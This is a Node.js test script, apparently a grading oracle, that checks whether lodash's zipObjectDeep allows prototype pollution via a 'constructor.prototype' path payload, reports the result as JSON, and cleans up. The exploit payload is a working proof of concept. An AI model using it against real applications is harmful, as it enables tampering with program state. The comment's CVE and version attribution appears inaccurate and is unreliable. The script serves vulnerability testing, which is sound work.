'use strict';

function main() {
  let _;
  try {
    _ = require('lodash');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  const marker = 'oracle_' + process.pid + '_' + Date.now();

  // Benign operation: prove zipObjectDeep / merge-style deep assignment works normally.
  let benignOk = false;
  try {
    const target = { a: 1 };
    const source = { b: 2, nested: { c: 3 } };
    const merged = _.merge(target, source);
    benignOk = merged.a === 1 && merged.b === 2 && merged.nested && merged.nested.c === 3;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign merge operation failed: ' + String(e && e.message)
    }));
    return;
  }

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign merge operation produced unexpected result'
    }));
    return;
  }

  const operation_completed = true; // benign op succeeded, so setup is proven good
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Ensure clean slate on Object.prototype for our marker key.
    delete Object.prototype[marker];

    // Use zipObjectDeep, which in vulnerable lodash <=4.17.11 is susceptible to
    // prototype pollution via a path like '__proto__.marker' paired with baseSet
    // internals (CVE-2018-16487 / related merge-family issue). This mirrors a
    // common untrusted-input attack vector where keys come from user data and
    // values are zipped into paths.
    const maliciousPaths = ['constructor.prototype.' + marker];
    const maliciousValues = ['polluted'];

    _.zipObjectDeep(maliciousPaths, maliciousValues);

    const pollutedValue = ({}).hasOwnProperty.call(Object.prototype, marker)
      ? Object.prototype[marker]
      : undefined;

    if (pollutedValue === 'polluted') {
      exploit_succeeded = true;
      evidence = 'Object.prototype.' + marker + ' was set to "polluted" via lodash.zipObjectDeep with constructor.prototype path payload';
    } else {
      exploit_succeeded = false;
      evidence = 'Object.prototype.' + marker + ' was not polluted after zipObjectDeep call; value=' + String(pollutedValue);
    }
  } catch (e) {
    // An exception during the malicious call, after benign success, counts as blocked.
    exploit_succeeded = false;
    evidence = 'Malicious zipObjectDeep call threw (treated as blocked): ' + String(e && e.message);
  } finally {
    // Clean up any pollution we may have introduced.
    try {
      delete Object.prototype[marker];
    } catch (cleanupErr) {
      // ignore cleanup errors
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
